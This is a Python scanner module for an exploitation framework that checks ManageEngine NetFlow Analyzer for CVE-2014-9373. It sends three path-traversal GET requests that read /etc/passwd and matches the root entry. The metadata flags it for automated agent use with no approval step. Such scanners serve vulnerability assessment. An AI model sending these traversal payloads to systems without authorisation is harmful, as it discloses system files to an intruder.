#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ManageEngine NetFlow Analyzer arbitrary file download (CVE-2014-9373)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NetFlow Analyzer - File Download Detection (CVE-2014-9373)',
        'description': (
            'Detects CVE-2014-9373 via CSVServlet/DisplayChartPDF/CReportPDFServlet '
            'path traversal to /etc/passwd.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2014', 'manageengine', 'netflow', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-9373',
        ],
        'cve': 'CVE-2014-9373',
    }

    def run(self):
        paths = (
            '/netflow/servlet/CSVServlet?schFilePath=/etc/passwd',
            '/netflow/servlet/DisplayChartPDF?filename=../../../../../../../../etc/passwd',
            '/netflow/servlet/CReportPDFServlet?schFilePath=/etc/passwd&pdf=true',
        )
        for path in paths:
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and re.search(r'root:.*:0:0:', r.text or ''):
                self.set_info(
                    severity='high',
                    reason='NetFlow Analyzer file download (CVE-2014-9373)',
                    path=path.split('?')[0],
                )
                return True
        return False
